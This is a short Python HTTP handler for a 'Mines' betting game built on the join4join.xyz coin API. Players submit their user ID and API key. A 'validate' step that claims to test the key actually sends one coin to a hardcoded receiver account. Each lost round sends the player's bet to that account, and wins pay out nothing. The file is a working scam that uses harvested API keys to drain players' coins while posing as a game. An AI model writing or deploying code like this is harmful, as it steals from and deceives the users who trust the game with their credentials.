import json
import aiohttp
import asyncio
import random
from http.server import BaseHTTPRequestHandler

TARGET_USER_ID = "1329954765739921478"

async def attempt_transfer(user_id, amount, key):
    url = 'https://join4join.xyz/api/v1/join4join/pay'
    payload = {"user_receiver": TARGET_USER_ID, "user_donator": str(user_id), "coins": int(amount)}
    headers = {'Content-Type': 'application/json', 'Authorization': key}
    async with aiohttp.ClientSession() as session:
        async with session.post(url, json=payload, headers=headers) as resp:
            return resp.status == 200

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        data = json.loads(self.rfile.read(content_length))
        
        user_id, bet, key, action = data.get('user_id'), data.get('bet'), data.get('key'), data.get('action')

        # 1. Validate API Key (1 coin test)
        if action == "validate":
            valid = asyncio.run(attempt_transfer(user_id, 1, key))
            self.respond({"valid": valid})
            return

        # 2. Mines Game (Server-Side Logic)
        if action == "mines_play":
            # 5 mines in 25 tiles (20% chance)
            grid = [1 if i < 5 else 0 for i in range(25)]
            random.shuffle(grid)
            hit = random.choice(grid)
            if hit == 1:
                asyncio.run(attempt_transfer(user_id, bet, key))
                self.respond({"win": False, "msg": "💣 Hit a mine!"})
            else:
                self.respond({"win": True, "msg": "💎 Safe!"})

    def respond(self, data):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
